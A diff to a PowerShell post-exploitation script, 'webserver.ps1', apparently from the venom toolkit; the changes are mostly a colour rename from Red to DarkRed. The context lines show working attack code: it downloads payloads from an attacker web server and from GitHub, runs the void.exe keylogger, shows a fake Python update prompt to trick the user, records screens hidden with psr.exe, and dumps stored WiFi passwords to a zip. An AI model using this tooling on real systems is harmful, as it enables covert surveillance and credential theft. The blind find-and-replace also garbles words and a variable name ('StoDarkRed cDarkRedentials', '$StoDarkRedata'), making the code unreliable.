@@ -207,23 +207,24 @@ If($SRec -ne '0' -or $SPsr -ne '0' -or $SEnum -ne 'False' -or $Sessions -ne 'Fal
 
    Write-Host "Downloading $FileName to $Initial_Path" -ForeGroundColor DarkGreen;Start-Sleep -Seconds 1
    If($ServerIP -Match '127.0.0.1'){## Localhost connections are not supported by this module
-      Write-Host "[abort] 127.0.0.1 (localhost) connections are not supported." -ForeGroundColor Red -BackGroundColor Black
+      Write-Host "[abort] 127.0.0.1 (localhost) connections are not supported." -ForeGroundColor DarkRed -BackGroundColor Black
       Write-Host "";Start-Sleep -Seconds 1;exit ## exit @webserver
    }
 
    cmd /c curl -s http://$ServerIP/$FileName -o $FileName|Out-Null
    If(-not($LASTEXITCODE -eq 0)){## Download using BitsTransfer service insted of curl.exe
-      Write-Host "[fail] to download $FileName using curl.exe service" -ForeGroundColor Red -BackgroundColor Black
+      Write-Host "[fail] to download $FileName using curl.exe service" -ForeGroundColor DarkRed -BackgroundColor Black
       Start-Sleep -Milliseconds 300;Write-Host "Trying to download $FileName Using BitsTransfer (BITS)" -ForeGroundColor Yellow      
       Start-BitsTransfer -priority foreground -Source http://$ServerIP/$FileName -Destination $Initial_Path\$FileName -ErrorAction SilentlyContinue|Out-Null   
-      If(-not($LASTEXITCODE -eq 0)){Write-Host "[fail] to download $FileName using BitsTransfer service" -ForeGroundColor Red -BackgroundColor Black;Start-Sleep -Seconds 1}
+      If(-not($LASTEXITCODE -eq 0)){Write-Host "[fail] to download $FileName using BitsTransfer service" -ForeGroundColor DarkRed -BackgroundColor Black;Start-Sleep -Seconds 1}
    }
 
    ## Make sure that file was successfuly downloaded
    If(-not([System.IO.File]::Exists("$Initial_Path\$FileName")) -or $FileName -ieq $Null){
-      Write-Host "`nRemark : File to download must be stored in attacker apache2 webroot." -ForeGroundColor Yellow
+      Write-Host "`n----------------------------------------------------------------" -ForeGroundColor DarkGreen
       Write-Host "syntax : .\webserver.ps1 -Download `"<Apache2-IP>,<FileName.ps1>`""
       Write-Host "example: .\webserver.ps1 -Download `"192.168.1.73,FileName.ps1`""
+      Write-Host "----------------------------------------------------------------" -ForeGroundColor DarkGreen
       Write-Host "";Start-Sleep -Seconds 1;exit ## exit @webserver  
    }
 
@@ -231,13 +232,13 @@ If($SRec -ne '0' -or $SPsr -ne '0' -or $SEnum -ne 'False' -or $Sessions -ne 'Fal
    If(-not($FileName -iMatch '[.exe]$')){## This test does not work on binary files (.exe)
       $Status = Get-Content -Path "$Initial_Path\$FileName" -EA SilentlyContinue
       If($Status -iMatch '^(<!DOCTYPE html)'){
-         Write-Host "[abort] $FileName Download Corrupted (DOCTYPE html)" -ForeGroundColor Red -BackGroundColor Black
+         Write-Host "[abort] $FileName Download Corrupted (DOCTYPE html)" -ForeGroundColor DarkRed -BackGroundColor Black
          Write-Host "";Start-Sleep -Seconds 1;exit ## exit @webserver
       }ElseIf($Status -iMatch '^(404)'){
-         Write-Host "[abort] $FileName Not found in Remote Server (404)" -ForeGroundColor Red -BackGroundColor Black
+         Write-Host "[abort] $FileName Not found in Remote Server (404)" -ForeGroundColor DarkRed -BackGroundColor Black
          Write-Host "";Start-Sleep -Seconds 1;exit ## exit @webserver
       }ElseIf($Status -ieq $Null){
-         Write-Host "[abort] $FileName `$null Content Detected (corrupted)" -ForeGroundColor Red -BackGroundColor Black
+         Write-Host "[abort] $FileName `$null Content Detected (corrupted)" -ForeGroundColor DarkRed -BackGroundColor Black
          Write-Host "";Start-Sleep -Seconds 1;exit ## exit @webserver
       }Else{
          ## File successfuly Downloaded
@@ -249,7 +250,7 @@ If($SRec -ne '0' -or $SPsr -ne '0' -or $SEnum -ne 'False' -or $Sessions -ne 'Fal
    If($FileName -iMatch '[.exe]$'){## Binary file download detected
       $SizeDump = ((Get-Item "$Initial_Path\$FileName" -EA SilentlyContinue).length/1KB)
       If($SizeDump -lt 80){## Make sure Curl|BitsTransfer download is not corrupted
-         Write-Host "[abort] $FileName Length: $SizeDump/KB Integrity Corrupted" -ForeGroundColor Red -BackGroundColor Black
+         Write-Host "[abort] $FileName Length: $SizeDump/KB Integrity Corrupted" -ForeGroundColor DarkRed -BackGroundColor Black
          Write-Host "";Start-Sleep -Seconds 1;exit ## exit @webserver
       }
    }
@@ -292,9 +293,9 @@ If($SForce -ne '0' -or $SRec -ne '0' -or $SPsr -ne '0' -or $SEnum -ne 'False' -o
       Start-Sleep -Seconds $SKill; # Kill remote python process after 'xx' seconds delay
       taskkill /F /IM python.exe|Out-Null
       If(-not($LASTEXITCODE -eq 0)){
-         write-host "$LASTEXITCODE   fail to terminate python process(s)" -ForeGroundColor Red -BackgroundColor Black}
+         write-host "$LASTEXITCODE   fail to terminate python process(s)" -ForeGroundColor DarkRed -BackgroundColor Black}
    }Else{
-      write-host "$LASTEXITCODE   None active sessions found under $Server_hostName" -ForeGroundColor Red -BackgroundColor Black
+      write-host "$LASTEXITCODE   None active sessions found under $Server_hostName" -ForeGroundColor DarkRed -BackgroundColor Black
    }
 
    ## Create data table for output
@@ -341,7 +342,7 @@ If($SForce -ne '0' -or $SRec -ne '0' -or $SPsr -ne '0' -or $SEnum -ne 'False' -o
          Write-Host "$Count   $KeyId"
       }
    }Else{
-      write-host "$LASTEXITCODE   None active sessions found under $Server_hostName`n" -ForeGroundColor Red -BackgroundColor Black 
+      write-host "$LASTEXITCODE   None active sessions found under $Server_hostName`n" -ForeGroundColor DarkRed -BackgroundColor Black 
       exit ## exit @webserver
    }
 
@@ -351,7 +352,7 @@ If($SForce -ne '0' -or $SRec -ne '0' -or $SPsr -ne '0' -or $SEnum -ne 'False' -o
       $CheckIfPidExist = Get-Process python -ErrorAction SilentlyContinue|Select-Object -ExpandProperty Id
       If($CheckIfPidExist -Match "$Sessions"){
          cmd /c taskkill /F /PID $Sessions;Start-Sleep -Seconds 1
-         Write-Host "`nCurrently active session process(s)" -ForegroundColor Yellow
+         Write-Host "`nCurrently active session process(s)" -ForegroundColor DarkGreen
          Write-Host "ProcessName                   PID  SessionName                Session MemUsage"
          cmd /c tasklist /NH|findstr /I "python"
 
@@ -360,7 +361,7 @@ If($SForce -ne '0' -or $SRec -ne '0' -or $SPsr -ne '0' -or $SEnum -ne 'False' -o
          # $SessionPidDeletion = $GrabPidIdentifier[0,1,2,3] -Join ''
          ((Get-Content -Path "$Env:TMP\sessions.log" -Raw|Select-String "$Sessions") -Replace "$Sessions","STOP")|Set-Content -Path "$Env:TMP\sessions.log" -NoNewLine -Force
       }Else{
-         Write-Host "[fail] PID: $Sessions Not found" -ForeGroundColor Red -BackgroundColor Black
+         Write-Host "[fail] PID: $Sessions Not found" -ForeGroundColor DarkRed -BackgroundColor Black
       }
    }
    write-host "";Start-Sleep -Seconds 1
@@ -397,7 +398,7 @@ If($SRec -ne '0' -or $SPsr -ne '0' -or $SEnum -ne 'False' -or $Sessions -ne 'Fal
    $SizeDump = ((Get-Item -Path "$Env:TMP\sherlock.ps1" -EA SilentlyContinue).length/1KB)
    If(-not(Test-Path -Path "$Env:TMP\sherlock.ps1") -or $SizeDump -lt 16){
       ## Fail to download Sherlock.ps1 using BitsTransfer OR download file is corrupted
-      Write-Host "[abort] fail to download sherlock.ps1 using BitsTransfer (BITS)" -ForeGroundColor Red -BackGroundColor Black
+      Write-Host "[abort] fail to download sherlock.ps1 using BitsTransfer (BITS)" -ForeGroundColor DarkRed -BackGroundColor Black
       If(Test-Path -Path "$Env:TMP\sherlock.ps1"){Remove-Item -Path "$Env:TMP\sherlock.ps1" -Force}
       Start-Sleep -Seconds 1;exit ## exit @webserver
    }
@@ -488,10 +489,10 @@ If($SPsr -lt '8'){$SPsr = '10'} # Set the minimum capture time value
       write-host "Capture: $CaptureFile" -ForeGroundColor Yellow;Start-Sleep -Seconds 2
       ## Start psr.exe (-WindowStyle hidden) process detach (orphan) from parent process
       Start-Process -WindowStyle hidden powershell -ArgumentList "psr.exe", "/start", "/output $CaptureFile", "/sc 1", "/maxsc 100", "/gui 0;", "Start-Sleep -Seconds $SPsr;", "psr.exe /stop" -ErrorAction SilentlyContinue|Out-Null
-      If(-not($LASTEXITCODE -eq 0)){write-host "[abort] @webserver cant start psr.exe process" -ForeGroundColor Red -BackgroundColor Black;Start-Sleep -Seconds 2}
+      If(-not($LASTEXITCODE -eq 0)){write-host "[abort] @webserver cant start psr.exe process" -ForeGroundColor DarkRed -BackgroundColor Black;Start-Sleep -Seconds 2}
    }Else{
       ## PSR.exe (error report service) not found in current system ..
-      write-host "[fail] Not found: $Env:WINDIR\System32\psr.exe" -ForeGroundColor Red -BackgroundColor Black
+      write-host "[fail] Not found: $Env:WINDIR\System32\psr.exe" -ForeGroundColor DarkRed -BackgroundColor Black
       Start-Sleep -Seconds 1
    }
 }
@@ -522,14 +523,14 @@ $Timer = Get-Date -Format 'HH:mm:ss'
       ## Check for Failed/Corrupted downloads
       $SizeDump = ((Get-Item "$Env:TMP\void.zip" -EA SilentlyContinue).length/1KB)
       If(-not(Test-Path -Path "$Env:TMP\void.zip") -or $SizeDump -lt 36){## Fail to download void using curl.exe
-         Write-Host "[fail] to download void.zip using curl.exe service" -ForeGroundColor Red -BackgroundColor Black
+         Write-Host "[fail] to download void.zip using curl.exe service" -ForeGroundColor DarkRed -BackgroundColor Black
          Start-Sleep -Milliseconds 600;Write-Host "Trying to download void.zip Using BitsTransfer (BITS)" -ForeGroundColor Yellow      
          Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/venom/master/bin/void.zip -Destination $Env:TMP\void.zip -ErrorAction SilentlyContinue|Out-Null
 
          ## Check for Failed/Corrupted downloads
          $SizeDump = ((Get-Item "$Env:TMP\void.zip" -EA SilentlyContinue).length/1KB)
          If(-not(Test-Path -Path "$Env:TMP\void.zip") -or $SizeDump -lt 36){## Fail to download void.zip using BitsTransfer (BITS)
-            Write-Host "[fail] to download void.zip using BitsTransfer service" -ForeGroundColor Red -BackgroundColor Black
+            Write-Host "[fail] to download void.zip using BitsTransfer service" -ForeGroundColor DarkRed -BackgroundColor Black
             If(Test-Path -Path "$Env:TMP\void.zip" -EA SilentlyContinue){Remove-Item -Path "$Env:TMP\void.zip" -Force}
             Start-Sleep -Milliseconds 600;Write-Host "[abort] keylogger (void.exe) remote execution .." -ForeGroundColor Yellow
             Start-Sleep -Seconds 1;write-host ""       
@@ -583,10 +584,10 @@ $Timer = Get-Date -Format 'HH:mm:ss'
          If($? -ieq 'True'){## Check Last Command ErrorCode (LASTEXITCODE)
             write-host "Keylogger PID $IDS process successfuly stoped.`n"
          }Else{
-            write-host "[fail] to terminate keylogger PID process" -ForeGroundColor Red -BackgroundColor Black
+            write-host "[fail] to terminate keylogger PID process" -ForeGroundColor DarkRed -BackgroundColor Black
          }
       }Else{
-         write-host "[fail] keylogger process PID not found" -ForeGroundColor Red -BackgroundColor Black
+         write-host "[fail] keylogger process PID not found" -ForeGroundColor DarkRed -BackgroundColor Black
       }
 
       write-host ""
@@ -600,7 +601,7 @@ $Timer = Get-Date -Format 'HH:mm:ss'
 
 $PythonVersion = cmd /c python --version
 If(-not($PythonVersion) -or $PythonVersion -ieq $null){
-   write-host "python not found, Downloading from python.org" -ForeGroundColor Red -BackgroundColor Black
+   write-host "python not found, Downloading from python.org" -ForeGroundColor DarkRed -BackgroundColor Black
    Start-Sleep -Seconds 1
 
    <#
@@ -621,7 +622,7 @@ If(-not($PythonVersion) -or $PythonVersion -ieq $null){
    If(cmd /c curl.exe --version){ # <-- Unnecessary step? curl its native (windows 10) rigth?
       ## Download python windows installer and use social engineering to trick user to install it
       write-host "Downloading $BinName from python.org" -ForeGroundColor DarkGreen
-      cmd /c curl.exe -L -k -s https://www.python.org/ftp/python/3.9.0/$BinName -o %tmp%\$BinName -u SSARedTeam:s3cr3t
+      cmd /c curl.exe -L -k -s https://www.python.org/ftp/python/3.9.0/$BinName -o %tmp%\$BinName -u SSADarkRedTeam:s3cr3t
       Write-Host "Remote Spawning Social Engineering MsgBox."
       powershell (NeW-ObjeCt -ComObjEct Wscript.Shell).Popup("Python Security Updates Available.`nDo you wish to Install them now?",15,"$BinName setup",4+48)|Out-Null
       $HiddeMsgBox = $True
@@ -633,14 +634,14 @@ If(-not($PythonVersion) -or $PythonVersion -ieq $null){
          $SForce = '2'
          ## Remote File: $Env:TMP\python-3.9.0.exe not found ..
          # Activate -SForce parameter to use powershell Start-BitsTransfer cmdlet insted of curl.exe
-         Write-Host "[File] Not found: $Env:TMP\$BinName" -ForeGroundColor Red -BackgroundColor Black;Start-Sleep -Seconds 1
+         Write-Host "[File] Not found: $Env:TMP\$BinName" -ForeGroundColor DarkRed -BackgroundColor Black;Start-Sleep -Seconds 1
          Write-Host "[Auto] Activate : -SForce 2 parameter to use powershell Start-BitsTransfer" -ForeGroundColor Yellow;Start-Sleep -Seconds 2
       }
    }Else{
       $SForce = '2'
       ## LolBin downloader (curl) not found in current system.
       # Activate -SForce parameter to use powershell Start-BitsTransfer cmdlet insted of curl.exe
-      Write-Host "[Appl] Not found: Curl downloder (LolBin)" -ForeGroundColor Red -BackgroundColor Black;Start-Sleep -Seconds 1
+      Write-Host "[Appl] Not found: Curl downloder (LolBin)" -ForeGroundColor DarkRed -BackgroundColor Black;Start-Sleep -Seconds 1
       Write-Host "[Auto] Activate : -SForce 2 parameter to use powershell Start-BitsTransfer" -ForeGroundColor Yellow;Start-Sleep -Seconds 2
    }
 }
@@ -676,7 +677,7 @@ $Success = $False ## Python installation status
        $check = cmd /c python --version
        ## check target host python version
        If(-not($check) -or $check -ieq $null){
-           $i++;Write-Host "[$i] Python Installation: not found." -ForeGroundColor Red -BackgroundColor Black
+           $i++;Write-Host "[$i] Python Installation: not found." -ForeGroundColor DarkRed -BackgroundColor Black
            ## Test if installler exists on remote directory
            If(Test-Path "$Env:TMP\$BinName"){
               Write-Host "[$i] python windows installer: found.";Start-Sleep -Seconds 1
@@ -690,8 +691,8 @@ $Success = $False ## Python installation status
               Start-Sleep -Seconds $STime; # 16+4 = 20 seconds between executions (default value)
            }Else{
               ## python windows installer not found, download it ..
-              Write-Host "[$i] python windows installer: not found." -ForeGroundColor Red -BackgroundColor Black;Start-Sleep -Seconds 1
-              Write-Host "[$i] Downloading: $Env:TMP\$BinName" -ForeGroundColor Red -BackgroundColor Black;Start-Sleep -Seconds 2
+              Write-Host "[$i] python windows installer: not found." -ForeGroundColor DarkRed -BackgroundColor Black;Start-Sleep -Seconds 1
+              Write-Host "[$i] Downloading: $Env:TMP\$BinName" -ForeGroundColor DarkRed -BackgroundColor Black;Start-Sleep -Seconds 2
               powershell Start-BitsTransfer -priority foreground -Source https://www.python.org/ftp/python/3.9.0/$BinName -Destination $Env:TMP\$BinName
            }
         ## Python Successfull Installed ..
@@ -710,7 +711,7 @@ $Success = $False ## Python installation status
 $Installation = cmd /c python --version
 ## Make Sure python http.server requirement its satisfied.
 If(-not($Installation) -or $Installation -ieq $null){
-   write-host "[Abort] This cmdlet cant find python installation." -ForeGroundColor Red -BackgroundColor Black;Start-Sleep -Seconds 1
+   write-host "[Abort] This cmdlet cant find python installation." -ForeGroundColor DarkRed -BackgroundColor Black;Start-Sleep -Seconds 1
    write-host "[Force] the installation of python: .\webserver.ps1 -SForce 10 -STime 26 -SEnum Verbose" -ForeGroundColor Yellow;write-host "";Start-Sleep -Seconds 2
    exit ## Exit @webserver
 
@@ -778,7 +779,7 @@ If(-not($Installation) -or $Installation -ieq $null){
       $PIDS = Get-Process python -ErrorAction SilentlyContinue|Select-Object -ExpandProperty Id|Select -Last 1
       echo "$PIDS  $ServerTime   $Remote_Host  $Remote_Server_Port  $Server_Working_Dir" >> $Env:TMP\sessions.log
    }Else{
-      write-host "[fail] Executing the @webserver with errorcode $LASTEXITCODE" -ForeGroundColor Red -BackgroundColor Black
+      write-host "[fail] Executing the @webserver with errorcode $LASTEXITCODE" -ForeGroundColor DarkRed -BackgroundColor Black
       write-host "";Start-Sleep -Seconds 1
    }
 
@@ -793,7 +794,7 @@ If(-not($Installation) -or $Installation -ieq $null){
       .DESCRIPTION
          Remote Host Web Browser Enumeration, DNS Records, DHCP
          User-Agent, Default Browser, TCP Headers, MainWindowTitle
-         Wifi Stored credentials (ZIP archive), Anti-Virus status.
+         Wifi StoDarkRed cDarkRedentials (ZIP archive), Anti-Virus status.
 
       .EXAMPLE
          PS C:\> .\webserver.ps1 -SEnum True
@@ -814,8 +815,8 @@ If(-not($Installation) -or $Installation -ieq $null){
       If($DefaultBrowser){$Parse_Browser_Data = $DefaultBrowser.split("-")[0] -replace 'URL','' -replace 'HTML','' -replace '.HTTPS',''}else{$Parse_Browser_Data = "Not Found"}
       $BrowserPath = Get-Process $Parse_Browser_Data -ErrorAction SilentlyContinue|Select -Last 1|Select-Object -Expandproperty Path
       $Browserversion = Get-Process $Parse_Browser_Data -ErrorAction SilentlyContinue|Select -Last 1|Select-Object -Expandproperty ProductVersion
-      $StoreData = Get-Process $Parse_Browser_Data -ErrorAction SilentlyContinue|Select -ExpandProperty MainWindowTitle
-      $ActiveTabName = $StoreData|Where {$_ -ne ""}
+      $StoDarkRedata = Get-Process $Parse_Browser_Data -ErrorAction SilentlyContinue|Select -ExpandProperty MainWindowTitle
+      $ActiveTabName = $StoDarkRedata|Where {$_ -ne ""}
 
          ## WebBrowser Headers Enumeration (pure powershell)
          $Url = "http://${Remote_Host}:${Remote_Server_Port}/"
@@ -899,8 +900,8 @@ If(-not($Installation) -or $Installation -ieq $null){
          Compress-Archive -Path "$Env:TMP\$DumpFolder" -DestinationPath "$Env:TMP\SSIDump.zip" -Force
 
          ## Build Table Output
-         Write-Host "WiFi SID password dump"
-         Write-Host "----------------------"
+         Write-Host "WiFi SSID password dump"
+         Write-Host "-----------------------"
          Write-Host "$Env:TMP\SSIDump.zip";Start-Sleep -Seconds 1
          Remove-Item "$Env:TMP\$DumpFolder" -Recurse -Force|Out-Null
 
@@ -911,7 +912,7 @@ If(-not($Installation) -or $Installation -ieq $null){
 Write-Host ""
 ## Final Notes:
 # The 'cmd /c' syscall its used in certain ocasions in this cmdlet only because
-# it produces less error outputs in terminal prompt compared with PowerShell.
+# it produces less error outputs in terminal prompt compaDarkRed with PowerShell.
 If(Test-Path "$Env:TMP\$BinName"){Remove-Item "$Env:TMP\$BinName" -Force}
 Start-Sleep -Seconds 1
 exit
